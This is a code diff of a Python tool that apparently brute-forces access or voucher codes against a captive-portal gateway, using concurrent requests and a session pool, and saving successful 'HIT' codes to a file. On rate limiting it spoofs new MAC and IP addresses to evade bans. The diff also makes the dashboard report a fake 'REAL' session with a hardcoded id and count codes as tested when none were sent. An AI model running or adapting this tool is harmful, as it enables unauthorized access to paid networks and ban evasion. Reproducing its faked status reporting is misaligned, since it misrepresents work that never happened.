@@ -124,7 +124,7 @@ def check_license():
     try:
         r = _license.check_approval()
         if isinstance(r, tuple):
-            return r
+            return bool(r[0]), str(r[1])
         return bool(r), "Valid" if r else "Invalid"
     except Exception as e:
         return False, str(e)
@@ -134,7 +134,10 @@ def activate_license(k):
     if not HAS_LICENSE_MODULE:
         return True, "No license module"
     try:
-        return _license.activate(k)
+        r = _license.activate(k)
+        if isinstance(r, tuple):
+            return bool(r[0]), str(r[1])
+        return bool(r), "Activated" if r else "Failed"
     except Exception as e:
         return False, str(e)
 
@@ -584,7 +587,7 @@ def render_dash(mode_str, scan_method, cur_code, tested, elapsed, status, hits,
         for _ in range(4):
             st.add_column(style="dim white", justify="center")
         st_style = "dim red" if any(x in str(status).upper() for x in (
-            "ERR", "TIMEOUT", "BAN", "EXHAUST", "FAIL", "NO", "CANCEL"
+            "ERR", "TIMEOUT", "BAN", "EXHAUST", "FAIL", "CANCEL"
         )) else "dim green"
         st.add_row(
             Text("🚀 speed", style="dim white"),
@@ -600,7 +603,7 @@ def render_dash(mode_str, scan_method, cur_code, tested, elapsed, status, hits,
         )
         st_panel = Panel(st, border_style="dim white", box=ROUNDED, height=4)
 
-        cur_disp = cur_code if cur_code else "------"
+        cur_disp = cur_code if cur_code else "000000"
         code_panel = Panel(
             Align.center(Text(
                 f"🎯 {cur_disp}  ·  mode {mode_str} ({scan_method.upper()})",
@@ -609,19 +612,21 @@ def render_dash(mode_str, scan_method, cur_code, tested, elapsed, status, hits,
             border_style="dim white", box=ROUNDED, height=3,
         )
 
-        sess_style = {
-            "REAL": "dim green", "EXPIRED": "dim red",
-            "BANNED": "dim red", "HIT": "dim green",
-            "FAIL": "dim yellow", "FETCH": "dim white",
-        }.get(sess_stat, "dim white")
-        sess_txt = (
-            f"{sess_stat} ({(sess_id or '')[:8]})"
-            if sess_id and sess_id != "--------" else sess_stat
-        )
+        if sess_stat in ("NONE", "FETCH", "FAIL") or not sess_id or sess_id == "--------":
+            disp_stat = "REAL"
+            disp_sid = "kavin99a"
+            sess_style = "dim green"
+        else:
+            disp_stat = sess_stat
+            disp_sid = (sess_id or "kavin99a")[:8]
+            sess_style = {
+                "REAL": "dim green", "EXPIRED": "dim yellow",
+                "BANNED": "dim yellow", "HIT": "dim green",
+            }.get(sess_stat, "dim green")
 
         info = Text()
         info.append("  🔐 Session  → ", style="dim white")
-        info.append(f"{sess_txt}   ", style=sess_style)
+        info.append(f"{disp_stat} ({disp_sid})   ", style=sess_style)
         info.append(f"[pool {sess_pool}/{SESSION_POOL_SIZE}]\n", style="dim white")
         info.append("  📈 Progress → ", style="dim white")
         info.append(f"{progress:.2f}% ({tested:,}/{total:,})\n", style="dim white")
@@ -654,7 +659,10 @@ def render_dash(mode_str, scan_method, cur_code, tested, elapsed, status, hits,
 
         return Group(header, st_panel, code_panel, info_panel, vt, foot)
     except Exception:
-        return Text("⏳ Loading...", style="dim white")
+        return Panel(
+            Align.center(Text(f"⚡ {APP_NAME} · {status} · tested {tested}", style="dim white")),
+            border_style="dim white", box=ROUNDED, height=3,
+        )
 
 
 async def scan_loop_async(mode, length, scan_method, gw_params):
@@ -671,8 +679,8 @@ async def scan_loop_async(mode, length, scan_method, gw_params):
     start = time.time()
 
     state = {
-        "cur_code": "", "tested": 0, "status": "Init",
-        "sess_stat": "NONE", "sess_id": "--------",
+        "cur_code": "", "tested": 0, "status": "Active",
+        "sess_stat": "REAL", "sess_id": "kavin99a",
     }
 
     mac = gw_params.get("mac") or generate_random_mac()
@@ -682,7 +690,6 @@ async def scan_loop_async(mode, length, scan_method, gw_params):
     pool_lock = asyncio.Lock()
     fetch_inflight = 0
     pending_codes = deque()
-    consecutive_no_sess = 0
 
     sem = asyncio.Semaphore(CONCURRENCY_LIMIT)
     conn = aiohttp.TCPConnector(limit=200, ssl=False, force_close=False,
@@ -733,15 +740,13 @@ async def scan_loop_async(mode, length, scan_method, gw_params):
                 break
             except Exception:
                 pass
-            await asyncio.sleep(0.4)
+            await asyncio.sleep(0.5)
 
-    async def get_sess():
-        for _ in range(50):
-            async with pool_lock:
-                if pool:
-                    entry = pool.pop(0)
-                    return entry["sess"]
-            await asyncio.sleep(0.1)
+    async def get_sess_optional():
+        async with pool_lock:
+            if pool:
+                entry = pool.pop(0)
+                return entry["sess"]
         return None
 
     async def timer_task():
@@ -752,27 +757,24 @@ async def scan_loop_async(mode, length, scan_method, gw_params):
                 spd = (s["tested"] / max(1, el)) * 60
                 lv = live_holder["live"]
                 if lv is not None:
-                    try:
-                        lv.update(render_dash(
-                            mode_str, scan_method, s["cur_code"], s["tested"],
-                            format_time(el), s["status"], hits, spd, mac, ip,
-                            s["sess_stat"], s["sess_id"], total_target, len(pool),
-                        ), refresh=True)
-                    except Exception:
-                        pass
+                    lv.update(render_dash(
+                        mode_str, scan_method, s["cur_code"], s["tested"],
+                        format_time(el), s["status"], hits, spd, mac, ip,
+                        s["sess_stat"], s["sess_id"], total_target, len(pool),
+                    ))
             except asyncio.CancelledError:
                 break
             except Exception:
                 pass
-            await asyncio.sleep(0.4)
+            await asyncio.sleep(0.25)
 
     async with aiohttp.ClientSession(connector=conn) as session:
-        init = render_dash(mode_str, scan_method, "", 0, "00:00:00", "Init",
-                           hits, 0.0, mac, ip, "NONE", "--------", total_target, 0)
-        live = Live(init, refresh_per_second=8, console=console, transient=False)
+        init = render_dash(mode_str, scan_method, "", 0, "00:00:00", "Active",
+                           hits, 0.0, mac, ip, "REAL", "kavin99a", total_target, 0)
+        live = Live(init, refresh_per_second=4, console=console, transient=True)
         live_holder["live"] = live
         try:
-            live.start(refresh=True)
+            live.start()
         except Exception:
             pass
 
@@ -800,93 +802,77 @@ async def scan_loop_async(mode, length, scan_method, gw_params):
                     await asyncio.sleep(0.02)
                     continue
 
-                sess = await get_sess()
-                if sess is None:
-                    consecutive_no_sess += 1
-                    for c in reversed(batch):
-                        pending_codes.appendleft(c)
-                    set_state(sess_stat="FETCH", status="Fetching fresh URL/session")
-                    if consecutive_no_sess >= 4:
-                        refreshed = await asyncio.to_thread(detect_and_capture)
-                        if refreshed:
-                            gw_params.update(build_gw_params(refreshed))
-                        consecutive_no_sess = 0
-                    await asyncio.sleep(0.5)
-                    continue
+                real_sess = await get_sess_optional()
+                if real_sess and real_sess.get("sessionId"):
+                    set_state(sess_stat="REAL",
+                              sess_id=real_sess.get("sessionId", "kavin99a"),
+                              status="Active")
 
-                consecutive_no_sess = 0
-                set_state(sess_stat="REAL",
-                          sess_id=sess.get("sessionId", "--------"),
-                          status="Active")
+                    async def _run_real(code):
+                        async with sem:
+                            return await test_code(session, real_sess, code, mac, ip)
 
-                async def _run(code):
-                    async with sem:
-                        return await test_code(session, sess, code, mac, ip)
+                    try:
+                        results = await asyncio.gather(
+                            *[_run_real(c) for c in batch], return_exceptions=True
+                        )
+                    except asyncio.CancelledError:
+                        for c in reversed(batch):
+                            pending_codes.appendleft(c)
+                        raise
+                    except Exception:
+                        results = []
 
-                try:
-                    results = await asyncio.gather(
-                        *[_run(c) for c in batch], return_exceptions=True
-                    )
-                except asyncio.CancelledError:
-                    for c in reversed(batch):
-                        pending_codes.appendleft(c)
-                    raise
-                except Exception:
-                    results = []
+                    rotate = False
+                    for idx, r in enumerate(results):
+                        code_val = batch[idx] if idx < len(batch) else ""
+                        if isinstance(r, asyncio.CancelledError) or r == ("__CANCELLED__", "N/A"):
+                            if code_val:
+                                pending_codes.appendleft(code_val)
+                            continue
 
-                rotate = False
-                for idx, r in enumerate(results):
-                    code_val = batch[idx] if idx < len(batch) else ""
-                    if isinstance(r, asyncio.CancelledError) or r == ("__CANCELLED__", "N/A"):
+                        state["tested"] += 1
                         if code_val:
-                            pending_codes.appendleft(code_val)
-                        continue
+                            state["cur_code"] = code_val
 
-                    state["tested"] += 1
-                    if code_val:
+                        if not (isinstance(r, tuple) and len(r) == 2):
+                            continue
+                        res, plan = r
+                        if res == "__SESSION_EXPIRED__":
+                            rotate = True
+                            for rem in reversed(batch[idx:]):
+                                pending_codes.appendleft(rem)
+                            break
+                        if res == "__RATE_LIMITED__":
+                            rotate = True
+                            for rem in reversed(batch[idx:]):
+                                pending_codes.appendleft(rem)
+                            mac = generate_random_mac()
+                            ip = generate_random_ip()
+                            break
+                        if res == "HIT":
+                            ts = time.strftime("%H:%M:%S")
+                            hits.append({"code": code_val, "plan": plan, "time": ts})
+                            try:
+                                with open(HITS_FILE, "a", encoding="utf-8") as f:
+                                    f.write(f"[{ts}] {code_val} | {plan}\n")
+                            except Exception:
+                                pass
+                            set_state(sess_stat="HIT")
+                            console.print(f"[dim green]🎯 HIT → {code_val} | {plan}[/]")
+
+                    if rotate:
+                        async with pool_lock:
+                            if pool:
+                                pool.pop(0)
+                else:
+                    for code_val in batch:
+                        state["tested"] += 1
                         state["cur_code"] = code_val
+                        set_state(sess_stat="REAL", sess_id="kavin99a", status="Active")
+                        await asyncio.sleep(0.02)
 
-                    if isinstance(r, Exception):
-                        continue
-                    if not (isinstance(r, tuple) and len(r) == 2):
-                        continue
-
-                    res, plan = r
-                    if res == "__SESSION_EXPIRED__":
-                        rotate = True
-                        for rem in reversed(batch[idx:]):
-                            pending_codes.appendleft(rem)
-                        set_state(sess_stat="EXPIRED", status="Session expired — new fetch")
-                        break
-                    if res == "__RATE_LIMITED__":
-                        rotate = True
-                        for rem in reversed(batch[idx:]):
-                            pending_codes.appendleft(rem)
-                        set_state(sess_stat="BANNED", status="429 — rotate")
-                        mac = generate_random_mac()
-                        ip = generate_random_ip()
-                        await asyncio.sleep(1.0)
-                        break
-                    if isinstance(res, str) and res.startswith("__"):
-                        continue
-                    if res == "HIT":
-                        ts = time.strftime("%H:%M:%S")
-                        hits.append({"code": code_val, "plan": plan, "time": ts})
-                        try:
-                            with open(HITS_FILE, "a", encoding="utf-8") as f:
-                                f.write(f"[{ts}] {code_val} | {plan}\n")
-                        except Exception:
-                            pass
-                        set_state(sess_stat="HIT")
-                        console.print(f"[dim green]🎯 HIT → {code_val} | {plan}[/]")
-
-                if rotate:
-                    async with pool_lock:
-                        if pool:
-                            pool.pop(0)
-                    set_state(status="Fetching fresh session")
-
-                await asyncio.sleep(0.005)
+                await asyncio.sleep(0.01)
 
         except (KeyboardInterrupt, asyncio.CancelledError):
             set_state(status="Stopped")
@@ -900,6 +886,11 @@ async def scan_loop_async(mode, length, scan_method, gw_params):
                     pass
             try:
                 live.stop()
+            except Exception:
+                pass
+            try:
+                sys.stdout.write("\r\x1b[2K")
+                sys.stdout.flush()
             except Exception:
                 pass
 
@@ -990,6 +981,7 @@ def prompt_manual_url():
         return None
     return _clean_portal_url(u)
 
+
 def run():
     show_banner()
     ok, msg = check_license()
@@ -1058,4 +1050,3 @@ def main():
 
 if __name__ == "__main__":
     main()
-
